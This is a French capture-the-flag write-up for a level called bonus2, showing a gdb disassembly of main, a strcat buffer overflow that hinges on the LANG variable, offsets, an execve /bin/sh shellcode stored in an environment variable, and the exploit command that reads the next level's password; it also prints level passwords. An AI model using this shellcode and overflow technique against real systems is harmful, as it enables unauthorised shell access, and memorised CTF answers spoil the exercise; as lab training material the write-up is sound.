On se connecte sur le bonus2, ou se trouve un **binaire** <code>bonus2</code>.

On cherche a savoir ce que fait ce binaire:

```gdb
> gdb -q bonus2
Dump of assembler code for function main:
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    $0x1,%eax
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    0x50(%esp),%ebx
   0x0804854c <+35>:    mov    $0x0,%eax
   0x08048551 <+40>:    mov    $0x13,%edx
   0x08048556 <+45>:    mov    %ebx,%edi
   0x08048558 <+47>:    mov    %edx,%ecx
   0x0804855a <+49>:    rep stos %eax,%es:(%edi)
   0x0804855c <+51>:    mov    0xc(%ebp),%eax
   0x0804855f <+54>:    add    $0x4,%eax
   0x08048562 <+57>:    mov    (%eax),%eax
   0x08048564 <+59>:    movl   $0x28,0x8(%esp)
   0x0804856c <+67>:    mov    %eax,0x4(%esp)
   0x08048570 <+71>:    lea    0x50(%esp),%eax
   0x08048574 <+75>:    mov    %eax,(%esp)
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax
   0x08048594 <+107>:   add    $0x28,%eax
   0x08048597 <+110>:   mov    %eax,(%esp)
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   movl   $0x8048738,(%esp)
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:   mov    0x9c(%esp),%eax
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   movl   $0x1,0x8049988
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:   mov    0x9c(%esp),%eax
   0x08048602 <+217>:   mov    %eax,(%esp)
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   %eax,%eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   movl   $0x2,0x8049988
   0x08048618 <+239>:   mov    %esp,%edx
   0x0804861a <+241>:   lea    0x50(%esp),%ebx
   0x0804861e <+245>:   mov    $0x13,%eax
   0x08048623 <+250>:   mov    %edx,%edi
   0x08048625 <+252>:   mov    %ebx,%esi
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
   0x08048633 <+266>:   pop    %ebx
   0x08048634 <+267>:   pop    %esi
   0x08048635 <+268>:   pop    %edi
   0x08048636 <+269>:   pop    %ebp
   0x08048637 <+270>:   ret
End of assembler dump.
```

Après analyse du fichier (**source.c**), on se rend compte que l'exploitation du fichier se fera par la fonction **strcat**.

Si la langue est set a 0 pendant l'overflow, seule la moitié de l'eip sera écrasée suite à la concaténation du **strcat**, on va donc devoir changer la langue pour pouvoir concaténer avec une chaine plus grande et écraser la totalité de l'eip.

> Si **LANG**=fi : **OFFSET** = 18  
> Si **LANG**=nl : **OFFSET** = 23

```shell
export LANG=fi
OU
export LANG=nl
```

On n'a pas la place dans la str pour utiliser une méthode ret2libc, donc on se tourne vers un shellcode:

```shell
export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

echo "#include <stdio.h>
#include <stdlib.h>
int main(){ printf(\"SHELL= %p\n\", getenv(\"SHELLCODE\")); return 0; }" > /tmp/getsh.c

cd /tmp/
gcc getsh.c
./a.out
SHELL= \x\x\x\x
cd
```
> On utilise donc le programme avec le premier argument plein, le second qui applique l'offset et l'adresse du shellcode.

(on utilise LANG=nl dans cet exemple)
<pre><code>./bonus2 $(python -c 'print "A" * 50') $(python -c 'print "B" * OFFSET + "\x\x\x\x"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBm���
> cd ../bonus3 && cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
</code></pre>

For download :
<pre><code>scp -P4242 bonus2@IP:bonus2 .</code></pre>
> Password : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245